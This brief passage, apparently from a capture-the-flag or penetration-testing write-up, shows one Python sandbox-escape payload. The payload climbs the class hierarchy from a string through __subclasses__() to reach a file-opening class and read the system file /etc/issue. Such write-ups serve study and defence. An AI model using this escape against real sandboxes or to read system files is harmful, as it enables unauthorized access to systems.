...
The next step was to try to run commands using the command 'rodnt'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/etc/issue').read():
